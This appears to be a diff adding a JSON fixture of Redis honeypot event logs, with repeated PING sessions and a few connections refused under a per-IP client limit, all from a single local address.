+        "uuid": "00000000-0000-4000-8000-000000000001"
+      },
+      "requests": {
+        "description": "Redis Honeypot",
+        "request": "PING"
+      },
+      "source": {
+        "address": "172.18.0.1",
+        "category": "ipv4",
+        "port": "43440",
+        "protocol": "tcp"
+      },
+      "target": {
+        "address": "192.0.2.10",
+        "category": "ipv4",
+        "port": "6379",
+        "protocol": "tcp"
+      },
+      "timestamp": "2026-10-30 16:14:24",
+      "timezone": "+0000"
+    },
+    {
+      "metadata": {
+        "arg_count": "0",
+        "client_id": "5",
+        "close_after_command": "False",
+        "command": "PING",
+        "command_category": "session",
+        "externalIP": "192.0.2.10",
+        "hostname": "example-sensor",
+        "internalIP": "192.0.2.20",
+        "outcome": "success",
+        "profile": "redis74",
+        "protocol": "redis",
+        "redis_db": "0",
+        "response_bytes": "7",
+        "response_class": "simple_string",
+        "session_duration": "0.00028946",
+        "session_duration_ms": "0",
+        "session_id": "6193671c087a2f976d929336f151c2a7",
+        "session_start": "2026-10-30T16:17:33.446027569Z",
+        "uuid": "00000000-0000-4000-8000-000000000001"
+      },
+      "requests": {
+        "description": "Redis Honeypot",
+        "request": "PING"
+      },
+      "source": {
+        "address": "172.18.0.1",
+        "category": "ipv4",
+        "port": "39528",
+        "protocol": "tcp"
+      },
+      "target": {
+        "address": "192.0.2.10",
+        "category": "ipv4",
+        "port": "6379",
+        "protocol": "tcp"
+      },
+      "timestamp": "2026-10-30 16:17:33",
+      "timezone": "+0000"
+    },
+    {
+      "metadata": {
+        "arg_count": "0",
+        "client_id": "5",
+        "close_after_command": "False",
+        "command": "PING",
+        "command_category": "session",
+        "externalIP": "192.0.2.10",
+        "hostname": "example-sensor",
+        "internalIP": "192.0.2.20",
+        "outcome": "success",
+        "profile": "redis74",
+        "protocol": "redis",
+        "redis_db": "0",
+        "response_bytes": "7",
+        "response_class": "simple_string",
+        "session_duration": "6.4289e-05",
+        "session_duration_ms": "0",
+        "session_id": "b26ddcea5abf325f322660651bd2f8b9",
+        "session_start": "2026-10-30T16:14:24.530826846Z",
+        "uuid": "00000000-0000-4000-8000-000000000001"
+      },
+      "requests": {
+        "description": "Redis Honeypot",
+        "request": "PING"
+      },
+      "source": {
+        "address": "172.18.0.1",
+        "category": "ipv4",
+        "port": "43448",
+        "protocol": "tcp"
+      },
+      "target": {
+        "address": "192.0.2.10",
+        "category": "ipv4",
+        "port": "6379",
+        "protocol": "tcp"
+      },
+      "timestamp": "2026-10-30 16:14:24",
+      "timezone": "+0000"
+    },
+    {
+      "metadata": {
+        "arg_count": "0",
+        "client_id": "6",
+        "close_after_command": "False",
+        "command": "PING",
+        "command_category": "session",
+        "externalIP": "192.0.2.10",
+        "hostname": "example-sensor",
+        "internalIP": "192.0.2.20",
+        "outcome": "success",
+        "profile": "redis74",
+        "protocol": "redis",
+        "redis_db": "0",
+        "response_bytes": "7",
+        "response_class": "simple_string",
+        "session_duration": "0.000178293",
+        "session_duration_ms": "0",
+        "session_id": "6fa93d333b796a51f8352ea93df0be60",
+        "session_start": "2026-10-30T16:17:33.447276536Z",
+        "uuid": "00000000-0000-4000-8000-000000000001"
+      },
+      "requests": {
+        "description": "Redis Honeypot",
+        "request": "PING"
+      },
+      "source": {
+        "address": "172.18.0.1",
+        "category": "ipv4",
+        "port": "39540",
+        "protocol": "tcp"
+      },
+      "target": {
+        "address": "192.0.2.10",
+        "category": "ipv4",
+        "port": "6379",
+        "protocol": "tcp"
+      },
+      "timestamp": "2026-10-30 16:17:33",
+      "timezone": "+0000"
+    },
+    {
+      "metadata": {
+        "arg_count": "0",
+        "client_id": "6",
+        "close_after_command": "False",
+        "command": "PING",
+        "command_category": "session",
+        "externalIP": "192.0.2.10",
+        "hostname": "example-sensor",
+        "internalIP": "192.0.2.20",
+        "outcome": "success",
+        "profile": "redis74",
+        "protocol": "redis",
+        "redis_db": "0",
+        "response_bytes": "7",
+        "response_class": "simple_string",
+        "session_duration": "7.8571e-05",
+        "session_duration_ms": "0",
+        "session_id": "e1d9faf67955158d5b51ca36250fe7db",
+        "session_start": "2026-10-30T16:14:24.531041199Z",
+        "uuid": "00000000-0000-4000-8000-000000000001"
+      },
+      "requests": {
+        "description": "Redis Honeypot",
+        "request": "PING"
+      },
+      "source": {
+        "address": "172.18.0.1",
+        "category": "ipv4",
+        "port": "43462",
+        "protocol": "tcp"
+      },
+      "target": {
+        "address": "192.0.2.10",
+        "category": "ipv4",
+        "port": "6379",
+        "protocol": "tcp"
+      },
+      "timestamp": "2026-10-30 16:14:24",
+      "timezone": "+0000"
+    },
+    {
+      "metadata": {
+        "arg_count": "0",
+        "client_id": "7",
+        "close_after_command": "False",
+        "command": "PING",
+        "command_category": "session",
+        "externalIP": "192.0.2.10",
+        "hostname": "example-sensor",
+        "internalIP": "192.0.2.20",
+        "outcome": "success",
+        "profile": "redis74",
+        "protocol": "redis",
+        "redis_db": "0",
+        "response_bytes": "7",
+        "response_class": "simple_string",
+        "session_duration": "0.000126376",
+        "session_duration_ms": "0",
+        "session_id": "1a45cf5f1ab23d333b287c21f90de737",
+        "session_start": "2026-10-30T16:17:33.448311418Z",
+        "uuid": "00000000-0000-4000-8000-000000000001"
+      },
+      "requests": {
+        "description": "Redis Honeypot",
+        "request": "PING"
+      },
+      "source": {
+        "address": "172.18.0.1",
+        "category": "ipv4",
+        "port": "39542",
+        "protocol": "tcp"
+      },
+      "target": {
+        "address": "192.0.2.10",
+        "category": "ipv4",
+        "port": "6379",
+        "protocol": "tcp"
+      },
+      "timestamp": "2026-10-30 16:17:33",
+      "timezone": "+0000"
+    },
+    {
+      "metadata": {
+        "arg_count": "0",
+        "client_id": "7",
+        "close_after_command": "False",
+        "command": "PING",
+        "command_category": "session",
+        "externalIP": "192.0.2.10",
+        "hostname": "example-sensor",
+        "internalIP": "192.0.2.20",
+        "outcome": "success",
+        "profile": "redis74",
+        "protocol": "redis",
+        "redis_db": "0",
+        "response_bytes": "7",
+        "response_class": "simple_string",
+        "session_duration": "5.5628e-05",
+        "session_duration_ms": "0",
+        "session_id": "e0877d6079f932a42b35292f0af5c469",
+        "session_start": "2026-10-30T16:14:24.531238855Z",
+        "uuid": "00000000-0000-4000-8000-000000000001"
+      },
+      "requests": {
+        "description": "Redis Honeypot",
+        "request": "PING"
+      },
+      "source": {
+        "address": "172.18.0.1",
+        "category": "ipv4",
+        "port": "43474",
+        "protocol": "tcp"
+      },
+      "target": {
+        "address": "192.0.2.10",
+        "category": "ipv4",
+        "port": "6379",
+        "protocol": "tcp"
+      },
+      "timestamp": "2026-10-30 16:14:24",
+      "timezone": "+0000"
+    },
+    {
+      "metadata": {
+        "arg_count": "0",
+        "client_id": "8",
+        "close_after_command": "False",
+        "command": "PING",
+        "command_category": "session",
+        "externalIP": "192.0.2.10",
+        "hostname": "example-sensor",
+        "internalIP": "192.0.2.20",
+        "outcome": "success",
+        "profile": "redis74",
+        "protocol": "redis",
+        "redis_db": "0",
+        "response_bytes": "7",
+        "response_class": "simple_string",
+        "session_duration": "0.000203043",
+        "session_duration_ms": "0",
+        "session_id": "fbdb9e86ed25c44cc05aee7521597191",
+        "session_start": "2026-10-30T16:17:33.450284098Z",
+        "uuid": "00000000-0000-4000-8000-000000000001"
+      },
+      "requests": {
+        "description": "Redis Honeypot",
+        "request": "PING"
+      },
+      "source": {
+        "address": "172.18.0.1",
+        "category": "ipv4",
+        "port": "39550",
+        "protocol": "tcp"
+      },
+      "target": {
+        "address": "192.0.2.10",
+        "category": "ipv4",
+        "port": "6379",
+        "protocol": "tcp"
+      },
+      "timestamp": "2026-10-30 16:17:33",
+      "timezone": "+0000"
+    },
+    {
+      "metadata": {
+        "arg_count": "0",
+        "client_id": "8",
+        "close_after_command": "False",
+        "command": "PING",
+        "command_category": "session",
+        "externalIP": "192.0.2.10",
+        "hostname": "example-sensor",
+        "internalIP": "192.0.2.20",
+        "outcome": "success",
+        "profile": "redis74",
+        "protocol": "redis",
+        "redis_db": "0",
+        "response_bytes": "7",
+        "response_class": "simple_string",
+        "session_duration": "6.633e-05",
+        "session_duration_ms": "0",
+        "session_id": "cccdd7495cae67cec206d65e471c6048",
+        "session_start": "2026-10-30T16:14:24.531419939Z",
+        "uuid": "00000000-0000-4000-8000-000000000001"
+      },
+      "requests": {
+        "description": "Redis Honeypot",
+        "request": "PING"
+      },
+      "source": {
+        "address": "172.18.0.1",
+        "category": "ipv4",
+        "port": "43486",
+        "protocol": "tcp"
+      },
+      "target": {
+        "address": "192.0.2.10",
+        "category": "ipv4",
+        "port": "6379",
+        "protocol": "tcp"
+      },
+      "timestamp": "2026-10-30 16:14:24",
+      "timezone": "+0000"
+    },
+    {
+      "metadata": {
+        "arg_count": "0",
+        "client_id": "9",
+        "close_after_command": "False",
+        "command": "PING",
+        "command_category": "session",
+        "externalIP": "192.0.2.10",
+        "hostname": "example-sensor",
+        "internalIP": "192.0.2.20",
+        "outcome": "success",
+        "profile": "redis74",
+        "protocol": "redis",
+        "redis_db": "0",
+        "response_bytes": "7",
+        "response_class": "simple_string",
+        "session_duration": "4.2208e-05",
+        "session_duration_ms": "0",
+        "session_id": "8074731fd31837e763455299736a08d1",
+        "session_start": "2026-10-30T16:17:33.451306605Z",
+        "uuid": "00000000-0000-4000-8000-000000000001"
+      },
+      "requests": {
+        "description": "Redis Honeypot",
+        "request": "PING"
+      },
+      "source": {
+        "address": "172.18.0.1",
+        "category": "ipv4",
+        "port": "39556",
+        "protocol": "tcp"
+      },
+      "target": {
+        "address": "192.0.2.10",
+        "category": "ipv4",
+        "port": "6379",
+        "protocol": "tcp"
+      },
+      "timestamp": "2026-10-30 16:17:33",
+      "timezone": "+0000"
+    },
+    {
+      "metadata": {
+        "arg_count": "0",
+        "client_id": "9",
+        "close_after_command": "False",
+        "command": "PING",
+        "command_category": "session",
+        "externalIP": "192.0.2.10",
+        "hostname": "example-sensor",
+        "internalIP": "192.0.2.20",
+        "outcome": "success",
+        "profile": "redis74",
+        "protocol": "redis",
+        "redis_db": "0",
+        "response_bytes": "7",
+        "response_class": "simple_string",
+        "session_duration": "6.6288e-05",
+        "session_duration_ms": "0",
+        "session_id": "0d413dfbd0a70e55a6914aa57e6abf31",
+        "session_start": "2026-10-30T16:14:24.531595111Z",
+        "uuid": "00000000-0000-4000-8000-000000000001"
+      },
+      "requests": {
+        "description": "Redis Honeypot",
+        "request": "PING"
+      },
+      "source": {
+        "address": "172.18.0.1",
+        "category": "ipv4",
+        "port": "43496",
+        "protocol": "tcp"
+      },
+      "target": {
+        "address": "192.0.2.10",
+        "category": "ipv4",
+        "port": "6379",
+        "protocol": "tcp"
+      },
+      "timestamp": "2026-10-30 16:14:24",
+      "timezone": "+0000"
+    },
+    {
+      "metadata": {
+        "externalIP": "192.0.2.10",
+        "hostname": "example-sensor",
+        "internalIP": "192.0.2.20",
+        "profile": "redis74",
+        "protocol": "redis",
+        "reason": "max_clients_per_ip",
+        "refused_count": "1",
+        "uuid": "00000000-0000-4000-8000-000000000001"
+      },
+      "requests": {
+        "description": "Redis Honeypot",
+        "request": "connection refused (max_clients_per_ip)"
+      },
+      "source": {
+        "address": "172.18.0.1",
+        "category": "ipv4",
+        "port": "39664",
+        "protocol": "tcp"
+      },
+      "target": {
+        "address": "192.0.2.10",
+        "category": "ipv4",
+        "port": "6379",
+        "protocol": "tcp"
+      },
+      "timestamp": "2026-10-30 16:17:33",
+      "timezone": "+0000"
+    },
+    {
+      "metadata": {
+        "externalIP": "192.0.2.10",
+        "hostname": "example-sensor",
+        "internalIP": "192.0.2.20",
+        "profile": "redis74",
+        "protocol": "redis",
+        "reason": "max_clients_per_ip",
+        "refused_count": "1",
+        "uuid": "00000000-0000-4000-8000-000000000001"
+      },
+      "requests": {
+        "description": "Redis Honeypot",
+        "request": "connection refused (max_clients_per_ip)"
+      },
+      "source": {
+        "address": "172.18.0.1",
+        "category": "ipv4",
+        "port": "43602",
+        "protocol": "tcp"
+      },
+      "target": {
+        "address": "192.0.2.10",
+        "category": "ipv4",
+        "port": "6379",
+        "protocol": "tcp"
+      },
+      "timestamp": "2026-10-30 16:14:24",
+      "timezone": "+0000"
+    }
+  ]
+}
